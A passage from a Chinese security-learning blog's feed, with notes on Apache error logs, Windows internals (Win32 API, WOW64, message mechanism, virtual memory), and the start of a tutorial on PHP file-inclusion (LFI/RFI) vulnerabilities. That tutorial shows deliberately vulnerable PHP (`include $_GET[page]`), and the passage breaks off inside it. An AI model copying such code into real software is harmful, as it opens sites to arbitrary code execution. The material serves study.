&lt;p&gt;错误日志无论在格式上还是在内容上都和访问日志不同。错误日志和访问日志一样提供丰富的信息，我们可以利用这些信息分析服务器的运行情况、哪里出现了问题。错误日志记录了服务器运行期间遇到的各种错误，以及一些普通的诊断信息，比如服务器何时启动、何时关闭等。我们可以设置日志文件记录信息级别的高低，控制日志文件记录信息的数量和类型。这是通过 LogLevel 指令设置的，该指令默认设置的级别是 error，即记录称得上错误的事件。有关该指令中允许设置的各种选项的完整清单，请参见 http://www.apache.org/docs/mod/core.html#loglevel 的 Apache 文档。在日志文件中的内容分属两类：文档错误和 CGI 错误。错误日志中偶尔也会出现配置错误，另外还有前面提到的服务器启动和关闭信息。&lt;/p&gt;
&lt;h3 id=&#34;1文档错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1文档错误&#34;&gt;#&lt;/a&gt; （1）文档错误&lt;/h3&gt;
&lt;p&gt;[Fri Mar 30 14:45:09 2018] [error] [client 192.168.115.120]&lt;/p&gt;
&lt;p&gt;user &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmNldmFwaUBzaW5nLmNvbQ==&#34;&gt;cevapi@sing.com&lt;/span&gt; : authentication failure for &amp;quot;/cgi-bin/hivpoo/cook.py&amp;quot; : password mismatch&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;错误发生的日期和时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;错误的级别或严重性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;导致错误的 IP 地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;错误信息本身。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2cgi错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2cgi错误&#34;&gt;#&lt;/a&gt; （2）CGI 错误&lt;/h3&gt;
&lt;p&gt;错误日志最主要的用途或许是诊断行为异常的 CGI 程序。为了进一步分析和处理方便，CGI 程序输出到 STDERR（Standard Error，标准错误设备）的所有内容都将直接进入错误日志。这意味着，任何编写良好的 CGI 程序，如果出现了问题，错误日志就会告诉我们有关问题的详细信息。CGI 程序错误输出到错误日志也有它的缺点，错误日志中将出现许多没有标准格式的内容，这使得用错误日志自动分析程序从中分析出有用的信息变得相当困难。&lt;/p&gt;
</content>
        <category term="web" scheme="https://self-ferry.github.io/categories/web/" />
        <category term="apache" scheme="https://self-ferry.github.io/tags/apache/" />
        <category term="log" scheme="https://self-ferry.github.io/tags/log/" />
        <updated>2021-01-22T14:37:03.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/</id>
        <title>《加密与解密》第一章</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=486999662&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;windows操作系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows操作系统&#34;&gt;#&lt;/a&gt; Windows 操作系统&lt;/h1&gt;
&lt;p&gt;本书研究 Windows 平台上的加密与解密，因此要求读者必须对操作系统有所了解。建议读者阅读 Windows 操作系统原理方面的书籍，这对深入理解本书的后续内容很有帮助。&lt;/p&gt;
&lt;h2 id=&#34;win32-api函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win32-api函数&#34;&gt;#&lt;/a&gt; Win32 API 函数&lt;/h2&gt;
&lt;p&gt;现在很多讲程序设计的书都基于 MFC 库和 OWL 库的 Windows 设计，对 Windows 实现细节鲜有讨论，而调试程序是要和系统底层打交道的，所以有必要掌握一些 API 函数的知识。&lt;/p&gt;
&lt;p&gt;对初学者来说，API 函数也许是一个时常耳闻却感觉有些神秘的东西。 API 的英文全称为 &amp;quot;Application Programming Interface&amp;quot; (应用程序编程接口), 要想理解这个定义，需要追溯操作系统的发展历史。 当 Windows 操作系统开始占据主导地位的时候，开发 Windows 平台上的应用程序成为人们的需要。 而在 Windows 程序设计发展的初期，Windows 程序员能够使用的编程工具只有 API 函数。这些函数提供应用程序运行所需要的窗口管理、图形设备接口、内存管理等服务功能。 这些功能以函数库的形式组织在一起，形成了 Windows 应用程序编程接口，简称 &amp;quot;Win API&amp;quot;, Win API 子系统负责将 API 调用转换成 Windows 操作系统的系统服务调用。 所以，可以认为 API 函数是整个 Windows 框架的基石，它的下面是 Windows 操作系统核心，它的上面则是 Windows 应用程序，如图 1.3 所示。 应用程序开发人员看到的 Windows 操作系统实际上就是 Win API, Windows 操作系统的其他部分对开发人员来说是完全透明的。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;用于 16 位 Windows 的 API (Windows 1.0~Windows 3.1) 称作 &amp;quot;Win16&amp;quot;, 用于 32 位 Windows 的 API ( Windows 9x/NT/2000/XP/7/10 ) 称作 &amp;quot;Win32&amp;quot;, 64 位 Windows API 的名称和功能基本没有变化，还是使用 Win32 的函数名，只不过是用 64 位代码实现的。 API 函数调用在从 Win16 到 Win32 的转变中保持兼容，并在数量和功能上不断增强 - Windows 1.0 只支持不到 450 个函数调用，现在已有几千个函数了。&lt;/p&gt;
&lt;p&gt;所有 32 位 Windows 都支持 Win16 API (以确保与旧的应用程序兼容) 和 Win32 API (以运行新的应用程序), 非常有趣的是，Windows NT/2000/xP/7 与 Windows 9x 的工作方式不同。 在 WindowsNT/2000XKP/7 中，Winl6 函数调用通过一个转换层转换为 Win32 函数调用，然后被操作系统处理。在 Windows 9x 中，该操作正好相反，Win32 函数调用通过转换层转换为 Win16 函数调用，再由操作系统进行处理。&lt;/p&gt;
&lt;p&gt;Windows 运转的核心是动态链接。 Windows 提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库 (DLL) 实现。 在 Windows 9x 中，DLL 通常位于 1WINDOWSYSTEM 子目录中。在 Windows NT72000/XP/7 中，DLL 通常位于系统安装目录的 SYSTEM 和 SYSTEM32 子目录中。&lt;/p&gt;
&lt;p&gt;在早期，Windows 的主要部分只需要在 3 个动态链接库中实现，它们分别代表 Windows 的 3 个主要子系统，叫作 Kernel, User 和 GDI。&lt;br /&gt;
- Kerel (由 KERNEL32.DLL 实现): 操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等。&lt;br /&gt;
- User (由 USER32.DL. 实现): 负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等。&lt;br /&gt;
- GDI (由 GD132.DLL 实现): 图形设备接口，允许程序在屏幕和打印机上显示文本和图形。&lt;/p&gt;
&lt;p&gt;除了上述模块，Windows 提供了其他 DLL 以支持更多的功能，包括对象安全性、注册表操作 (ADVAPI32. DLL)、通用控件 (COMCTL.32.DL)、公共对话框 (COMDLG32. DLL )、用户界面外壳 SHELL32.DLL) 和网络 (NETAPI32. DLL)。&lt;/p&gt;
&lt;p&gt;虽然 Win API 是一个基于 C 语言的接口，但是 Win API 中的函数可以由用不同语言编写的程序调用，因此，我们只要在调用时遵循调用的规范即可。&lt;/p&gt;
&lt;p&gt;Unicode 影响着计算机工业的每个部分，对操作系统和编程语言的影响最大。 NT 系统是使用 Unicode 标准字符集重新开发的，其系统核心完全是用 Unicode 函数工作的。 如果希望调用一个 Windows 函数并向它传递一个 ANSI 字符串，系统会先将 ANSI 字符串转换成 Unicode 字符串，再将 Unicode 字符串传递给操作系统。 相反，如果希望函数返回 ANSI 字符串，系统会先将 Unicode 字符串转换成 ANSI 字符串，然后将结果返回应用程序。 也就是说，在 NT 架构下，Win32 API 能接受 Unicode 和 ASCI 两种字符集，而其内核只能使用 Unicode 字符集。 尽管这些操作对用户来说都是透明的，但字符串的转换需要占用系统资源。&lt;/p&gt;
&lt;p&gt;在 Win32 API 函数字符集中，&amp;quot;A&amp;quot; 表示 ANSI, &amp;quot;W&amp;quot; 表示 Widechars (即 Unicode), 前者就是通常使用的单字节方式；后者是宽字节方式，以便处理双字节字符。 每个以字符串为参数的 Win32 函数在操作系统中都有这两种方式的版本。 例如，在编程时使用 MessageBox 函数，而在 USER32.DLL 中却没有 32 位 MessageBox 函数的人口。 实际上有两个人口，一个名为 &amp;quot;MessageBoxA&amp;quot; ( ANSI 版), 另一个名为 &amp;quot;MessageBoxW&amp;quot; (宽字符版)。 幸运的是，程序员通常不必关心这个问题，只需要在编程时使用 MessageBox 函数，开发工具的编译模块就会根据设置来决定是采用 MessageBoxA 还是 MessageBoxW。&lt;/p&gt;
&lt;p&gt;这里以 MessageBox 函数为例讨论一下。 此函数用于在 USER32.DLL 用户模块中创建和显示信息框，函数原型如下。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;MessageBox&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HWND hWnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 父窗口句柄 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LPCTSTR IpText&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 消息框文本地址 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LPCTSTR IpCaption&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 消息框标题地址 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;UINT uType          &lt;span class=&#34;token comment&#34;&gt;// 消息框样式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;看一看 Windows 2000 里 MessageBoxA 函数的内部结构，具体如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int MessageBoxA( 
MessageBoxExA &amp;#123;   //调用MessageBoxExA函数 
MBTоWCSEx()        //将MessageBoxA消息框的主体文字转换成Unicode字符串 
MBToWCSEx()       //将MessageBoxA消息框标题栏上的文字转换成Unicode字符串 
MessageBoxExW( )  //调用MessageBoxExw函数 
HeapFree ( ) //释放内存
&amp;#125;
);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个结果表明，MessageBoxExA 函数其实是一个替换翻译层，用于分配内存，并将 ANSI 字符串转换成 Unicode 字符串，系统最终调用 Unicode 版的 MessageBoxExW 函数执行。 当 Message BoxW 函数返回时，它便释放内存缓存。 在这个过程中，系统必须执行这些额外的转换操作，因此，ANSI 版的应用程序需要更多的内存及更多的 CPU 资源，而 Unicode 版的程序在 NT 架构下的执行效率高了很多。&lt;/p&gt;
&lt;p&gt;Win32 程序大量调用系统提供的 API 函数，而 Win32 平台上的调试器 (例如 ollybg 等) 恰好有针对 API 函数设置断点的强大功能，因此，掌握常见 API 函数的用法会给程序的跟踪调试带来极大的方便 (详细的 Win32 API 参考文档可以从 MSDN 网站获得), 建议读者掌握一定的 Win32 编程知识 (可参考《Windows 程序设计》一书), 这对合理选择 API 函数有很大的帮助。&lt;/p&gt;
&lt;h2 id=&#34;wow64&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wow64&#34;&gt;#&lt;/a&gt; WOW64&lt;/h2&gt;
&lt;p&gt;wow64 (Windows-on-Windows 64-bit) 是 64 位 Windows 操作系统的子系统，可以使大多数 32 位应用程序在不进行修改的情况下运行在 64 位操作系统上。&lt;/p&gt;
&lt;p&gt;64 位的 Windows, 除了带有 64 位操作系统应有的系统文件，还带有 32 位操作系统应有的系统文件。Windows 的 64 位系统文件都放在一个叫作 &amp;quot;System32&amp;quot; 的文件夹中，\Windows\System32 文件夹中包含原生的 64 位映像文件。为了兼容 32 位操作系统，还增加了 \Windows\SysWOW64 文件夹，其中存储了 32 位的系统文件。&lt;/p&gt;
&lt;p&gt;64 位应用程序会加载 System32 目录下 64 位的 kernel32.dll, user32.dll 和 ntdll.dll。当 32 位应用程序加载时，wow64 建立 32 位 ntdl.da 所要求的启动环境，将 CPU 模式切换至 32 位，并开始执行 32 位加载器，就如同该进程运行在原生的 32 位系统上一样。wow64 会对 32 位 ntdll.dl 的调用重定向 ntdll.dl (64 位), 而不是发出原生的 32 位系统调用指令。wow64 转换到原生的 64 位模式，捕获与系统调用有关的参数，发出对应的原生 64 位系统调用。当原生的系统调用返回时，wow64 在返回 32 位模式之前将所有输出参数从 64 位转换成 32 位。&lt;/p&gt;
&lt;p&gt;wow64 既不支持 16 位应用程序的执行 (32 位 Windows 支持 16 位应用程序的执行), 也不支持加载 32 位内核模式的设备驱动程序。wow64 进程只能加载 32 位的 DLL, 不能加载原生的 64 位 DLL。类似的，原生的 64 位进程不能加载 32 位的 DLL。&lt;/p&gt;
&lt;h2 id=&#34;windows消息机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows消息机制&#34;&gt;#&lt;/a&gt; Windows 消息机制&lt;/h2&gt;
&lt;p&gt;Windows 是一个消息 (Message) 驱动式系统。Windows 消息提供在应用程序与应用程序之间、应用程序与 Windows 系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。&lt;br /&gt;
Windows 系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由 Windows 监控。当一个事件发生时，Windows 先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的窗口函数。一个事件从发生到到达处理它的窗口函数必须经历上述过程。值得注意的是消息的非抢先性，即不论事件的急与缓，总是按到达的先后排队 (一些系统消息除外), 而这可能导致一些外部实时事件得不到及时的处理。&lt;/p&gt;
&lt;p&gt;因为 Windows 本身是由消息驱动的，所以在调试程序时跟踪一个消息会得到相当底层的答案。&lt;/p&gt;
&lt;p&gt;下面将常用的 Windows 消息函数列出，以供参考。&lt;br /&gt;
(1) SendMessage 函数调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。该函数示例如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;LRESULT SendMessage ( 
HWND hWnd,         //目的窗口的句柄 
UINT Msg,           //消息标识符 
WPARAM wParam,   //消息的WPARAM域 
LPARAM 1Param //消息的LPARAM域
&amp;#125; ;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回值：由具体的消息决定。如果消息投递成功，则返回 &amp;quot;TRUE&amp;quot; (非零)。&lt;/p&gt;
&lt;p&gt;(2) WM-COMMAND 消息当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送，示例如下。Visual C++ 的 WINUSER.H 文件定义，WM_COMMAND 消息所对应的十六进制数是 0111h。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;WM_COMMAND 
    wNotifyCode = HIWORD (WParam);   //通告代码 
    wID = LOWORD (wParam);   //菜单条目、控件或快捷键的标识符 
    hwndctl = (HWND) IParam; //按件句柄
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回值：如果应用程序处理这条消息，则返回值为零。&lt;/p&gt;
&lt;p&gt;(3) WM_DESTROY 消息当一个窗口被销毁时发送该消息。该消息的十六进制数是 02h, 没有参数。&lt;/p&gt;
&lt;p&gt;返回值：如果应用程序处理这条消息，则返回值为零。&lt;/p&gt;
&lt;p&gt;(4) WM-GETTEXT 消息应用程序发送一条 WM_GETTEXT 消息，将一个对应窗口的文本复制到一个由呼叫程序提供的缓冲区中，示例如下。WM_GETTEXT 消息的十六进制数是 0Dh。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;WM GETTEXT
    wParam = (WPARAM) cchTextMax;  //需要复制的字符数
    lParam = (LPARAM) IpszText;   //接收文本的缓冲区地址
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回值：被复制的字符数。&lt;/p&gt;
&lt;p&gt;(5) wMLQUTT 消息当应用程序调用 PostQuitMessage 函数时，生成 WM-QUIT 消息，示例如下。WM_QUTT 消息的十六进制数是 012h&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;WM QUIT
nExitCode = (int) wParam;//退出代码
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回值：这条消息没有返回值。&lt;/p&gt;
&lt;p&gt;(6) WM_LBUTTONDOWN 消息当光标停在一个窗口的客户区且用户按下鼠标左键时，wMLBUTTONDOWN 消息将被发送，示例如下。如果鼠标动作未被捕获，这条消息将被发送给光标下的窗口；否则，将被发送给已经捕获鼠标动作的窗口。WM_LBUTTONDOWN 消息的十六进制数是 0201h。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;WM LBUTTONDOWN 
fwKeys = wParam;                //key旗标 
xPos = LOWORD (IParam);  //光标的水平位置 
yPos = HIWORD (IParam);  //光标的垂直位置
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;虚拟内存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟内存&#34;&gt;#&lt;/a&gt; 虚拟内存&lt;/h2&gt;
&lt;p&gt;在默认情况下，32 位 Windows 操作系统的地址空间在 4GB 以内。Win32 的平坦内存模式使每个进程都拥有自己的虚拟空间。对 32 位进程来说，这个地址空间是 4CB, 因为 32 位指针拥有 00000000h~FFFFFFFFh 任何值。此时，程序的代码和数据都放在同一地址空间中，不必区分代码段和数据段。&lt;/p&gt;
&lt;p&gt;虚拟内存 (Virtual Memory) 不是真正的内存，它通过映射 (Map) 的方法使可用虚拟地址 ( VirtualAddress ) 达到 4GB, 每个应用程序可以获得 2GB 的虚拟地址，剩下的 2GB 留给操作系统自用。在 Windows NT 中，应用程序甚至可以获得 3GB 的虚拟地址。&lt;/p&gt;
&lt;p&gt;Windows 是一个分时的多任务操作系统，CPU 时间在被分成一个个时间片后分配给不同的程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的 4GB 寻址空间，互不干扰。在物理内存中，操作系统和系统 DLL. 代码需要供每个应用程序调用，所以它们在任意时刻必须被映射。用户的 EXE 程序只在自己所属的时间片内被映射，用户 DLL 则有选择地被映射。&lt;/p&gt;
&lt;p&gt;简单地说，虚拟内存的实现方法和过程如下。&lt;/p&gt;
&lt;p&gt;①当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配 2CB 的虚拟地址 (不是内存，只是地址)。&lt;/p&gt;
&lt;p&gt;②虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址 (注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的)。&lt;/p&gt;
&lt;p&gt;③如果使用 DLL, DLL 也会被映射到进程的虚拟地址空间中，在需要的时候才会被读入物理内存。&lt;/p&gt;
&lt;p&gt;④其他项目 (数据、堆栈等) 的空间是从物理内存中分配的，并被映射到虚拟地址空间中。&lt;/p&gt;
&lt;p&gt;⑤应用程序通过使用其虚拟地址空间中的地址开始执行。然后，虚拟内存管理器把每次内存访问映射到物理位置。&lt;/p&gt;
&lt;p&gt;看不明白上面的步骤也不要紧，但要明白以下几点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应用程序不会直接访问物理地址。&lt;/li&gt;
&lt;li&gt;虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问。&lt;/li&gt;
&lt;li&gt;每个应用程序都有独立的 4GB 寻址空间，不同应用程序的地址空间是彼此隔离的。&lt;/li&gt;
&lt;li&gt;DLL 程序没有 “私有” 空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。其原因是：如果 DLL 不与其他程序处于同一个地址空间，应用程序就无法调用它。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用虚拟内存的好处是：简化了内存的管理，弥补了物理内存的不足，可以防止多任务环境下应用程序之间的冲突。&lt;br /&gt;
64 位 Windows 操作系统提供了 16TB 的有效寻址空间，其中的一半可用于用户模式的应用程序。&lt;/p&gt;
&lt;h1 id=&#34;反思&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反思&#34;&gt;#&lt;/a&gt; 反思&lt;/h1&gt;
&lt;p&gt;不会的太多了，明天开始还是接着看视频吧。初学者不知道重点在哪。脑壳痛，giao!&lt;/p&gt;
</content>
        <category term="加密与解密" scheme="https://self-ferry.github.io/categories/encryption-and-decryption/" />
        <category term="win32api" scheme="https://self-ferry.github.io/tags/win32api/" />
        <category term="WOW64" scheme="https://self-ferry.github.io/tags/WOW64/" />
        <category term="windows消息机制" scheme="https://self-ferry.github.io/tags/windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/" />
        <category term="虚拟内存" scheme="https://self-ferry.github.io/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" />
        <updated>2021-01-20T04:24:48.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
        <title>web漏洞-文件包含</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;http://music.163.com/#/song?id=33522741&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;文件包含漏洞简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞简介&#34;&gt;#&lt;/a&gt; 文件包含漏洞简介&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;什么是文件包含漏洞？&lt;br /&gt;
程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件包含漏洞的成因&lt;br /&gt;
随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为&lt;ins class=&#34;primary&#34;&gt;变量&lt;/ins&gt;，用来进行动态调用，用户可以对&lt;ins class=&#34;primary&#34;&gt;变量的值可控&lt;/ins&gt;而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;php 中常见包含文件的函数
&lt;ul&gt;
&lt;li&gt;include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续&lt;ins class=&#34;primary&#34;&gt;向下执行&lt;/ins&gt;。&lt;/li&gt;
&lt;li&gt;include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，&lt;ins class=&#34;primary&#34;&gt;程序只调用一次&lt;/ins&gt;&lt;/li&gt;
&lt;li&gt;require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并&lt;ins class=&#34;primary&#34;&gt;终止脚本的运行&lt;/ins&gt;。&lt;/li&gt;
&lt;li&gt;require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，&lt;ins class=&#34;primary&#34;&gt;程序只调用一次&lt;/ins&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件包含漏洞的分类&lt;/p&gt;
&lt;p&gt;文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。&lt;/p&gt;
&lt;p&gt;1、本地文件包含 LFI (Local File Include)&lt;/p&gt;
&lt;p&gt;2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）&lt;/p&gt;
&lt;p&gt;在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件包含漏洞的危害&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配合文件上传漏洞 GetShell&lt;/li&gt;
&lt;li&gt;可以执行任意脚本代码&lt;/li&gt;
&lt;li&gt;网站源码文件以及配置文件泄露&lt;/li&gt;
&lt;li&gt;远程包含 GetShell&lt;/li&gt;
&lt;li&gt;控制整个网站甚至是服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;常见漏洞环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见漏洞环境&#34;&gt;#&lt;/a&gt; 常见漏洞环境&lt;/h1&gt;
&lt;p&gt;了解这些主要是为了绕过&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;示例&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token 